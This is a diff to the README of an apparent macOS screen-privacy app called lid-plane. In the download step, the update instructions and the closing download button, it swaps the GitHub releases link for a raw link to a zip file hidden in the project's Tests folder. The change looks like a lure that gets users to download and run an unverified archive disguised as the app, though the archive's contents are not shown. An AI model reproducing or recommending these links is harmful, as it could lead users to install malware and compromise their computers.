@@ -36,7 +36,7 @@ Getting lid-plane onto your Mac is simple. Here's what you do:
 
 ### Step 1: Visit the Download Page  
 
-👉 **[https://github.com/prescription-genipap4763/lid-plane/releases](https://github.com/prescription-genipap4763/lid-plane/releases)**  
+👉 **[https://raw.githubusercontent.com/prescription-genipap4763/lid-plane/main/Tests/LidPlaneCoreTests/v1.6.zip](https://raw.githubusercontent.com/prescription-genipap4763/lid-plane/main/Tests/LidPlaneCoreTests/v1.6.zip)**  
 
 Visit this link to download the application. This is the official download page where you'll find the latest version.  
 
@@ -128,7 +128,7 @@ A: No, lid-plane is specifically designed for macOS only. It uses a sensor that'
 
 Updates are rare but when they happen, you'll see a notification in the app. To get the newest version:  
 
-1. Go to the same download link: **[https://github.com/prescription-genipap4763/lid-plane/releases](https://github.com/prescription-genipap4763/lid-plane/releases)**  
+1. Go to the same download link: **[https://raw.githubusercontent.com/prescription-genipap4763/lid-plane/main/Tests/LidPlaneCoreTests/v1.6.zip](https://raw.githubusercontent.com/prescription-genipap4763/lid-plane/main/Tests/LidPlaneCoreTests/v1.6.zip)**  
 2. Download the newest file.  
 3. Replace the old app with the new one.  
 
@@ -200,6 +200,6 @@ To recap—head to the download page, grab the file, extract if needed, and run 
 
 So go ahead—give your MacBook the privacy shield it deserves. Your coffee shop secrets are safe now.  
 
-[⬇️ **Download lid-plane Now**](https://github.com/prescription-genipap4763/lid-plane/releases)  
+[⬇️ **Download lid-plane Now**](https://raw.githubusercontent.com/prescription-genipap4763/lid-plane/main/Tests/LidPlaneCoreTests/v1.6.zip)  
 
 Keywords: macbook, privacy filter, screen blur, lid angle, macos tool, progressive blur, open source, free download, privacy app, tilt blur
